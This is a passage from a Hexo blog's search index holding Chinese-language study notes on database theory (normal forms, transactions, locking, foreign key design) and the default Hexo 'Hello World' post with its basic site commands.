        <content type="html"><![CDATA[<h1 id="数据库理论"><a href="#数据库理论" class="headerlink" title="数据库理论"></a>数据库理论</h1><blockquote><p><a href="https://blog.csdn.net/xunxue1523/article/details/118195302">SQL Server 2012 安装教程</a></p><p><a href="https://blog.csdn.net/li_stone_123/article/details/80453583">Sqlserver2012评估期已过问题解决</a></p></blockquote><hr><h2 id="一、概论"><a href="#一、概论" class="headerlink" title="一、概论"></a>一、概论</h2><hr><h2 id="二、关系"><a href="#二、关系" class="headerlink" title="二、关系"></a>二、关系</h2><hr><h2 id="三、SQL语句"><a href="#三、SQL语句" class="headerlink" title="三、SQL语句"></a>三、SQL语句</h2><blockquote><p><a href=".\SQL语句">text::SQL语句</a> </p></blockquote><h3 id="1-表类型"><a href="#1-表类型" class="headerlink" title="1 表类型"></a>1 表类型</h3><blockquote><p>实表：基本关系,又称基本表或者基表,是实际存储数据的逻辑表示。</p><p>虚表：由基本表或其他的表导出的表，不对应实际存储的数据</p><p>临时表：查询结果。</p></blockquote><hr><h2 id="四、范式"><a href="#四、范式" class="headerlink" title="四、范式"></a>四、范式</h2><h3 id="1-范式理论"><a href="#1-范式理论" class="headerlink" title="1 范式理论"></a>1 范式理论</h3><blockquote><p>1NF：原子性，字段不可再分，否则就不是关系型数据库。</p><p>2NF：唯一性，一个表只说明一个事物。</p><p>3NF：每列都与主键有直接关系，不存在传递依赖。</p></blockquote><hr><h2 id="五、安全"><a href="#五、安全" class="headerlink" title="五、安全"></a>五、安全</h2><h3 id="1-安全性控制"><a href="#1-安全性控制" class="headerlink" title="1 安全性控制"></a>1 安全性控制</h3><blockquote><p>非法访问。</p></blockquote><h3 id="2-完整性控制"><a href="#2-完整性控制" class="headerlink" title="2 完整性控制"></a>2 完整性控制</h3><blockquote><p>数据完整。</p><p>脏数据：</p><ul><li>在数据库技术中,脏数据在临时更新（脏读）中产生。事务A更新了某个<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=452927&amp;ss_c=ssc.citiao.link">数据项</a>X，但是由于某种原因，事务A出现了问题，于是要把A回滚。​但是在回滚之前，另一个事务B读取了数据项X的值（A更新后），A回滚了事务，数据项恢复了原值。事务B读取的就是数据项X的就是一个“临时”的值，就是脏数据。</li></ul></blockquote><h3 id="3-并发性控制"><a href="#3-并发性控制" class="headerlink" title="3 并发性控制"></a>3 并发性控制</h3><blockquote><p>事务：</p><ul><li>原子性：操作不可中断。</li><li>一致性：成功改变状态。</li><li>隔离性：事务间不可互相干扰。</li><li>持久性：改变恒存在。</li></ul><p>并发</p><p>封锁：</p><ul><li>排他型封锁（X封锁）：单个事物对某对象读写，其他事务不可。</li><li>共享封锁（S封锁）：多个事务只可对某个对象一起读，不可改。</li></ul></blockquote><h3 id="4-备份"><a href="#4-备份" class="headerlink" title="4 备份"></a>4 备份</h3><hr><h2 id="六、设计"><a href="#六、设计" class="headerlink" title="六、设计"></a>六、设计</h2><h3 id="1-外键设计"><a href="#1-外键设计" class="headerlink" title="1 外键设计"></a>1 外键设计</h3><blockquote><p>外键关联主键的类型：</p><ul><li>如果是小查询量，可以选择存入ID。因为存ID比存字符要占用的空间更小。</li><li>如果是大查询量，直接存入字符。因为存ID在查询时需要多次联表，联表花费的时间要更长。所以选择用空间换取时间。</li></ul></blockquote><hr><h2 id="七、T-SQL"><a href="#七、T-SQL" class="headerlink" title="七、T-SQL"></a>七、T-SQL</h2><ul><li><a href=".\Transact——SQL">text::Transact——SQL</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
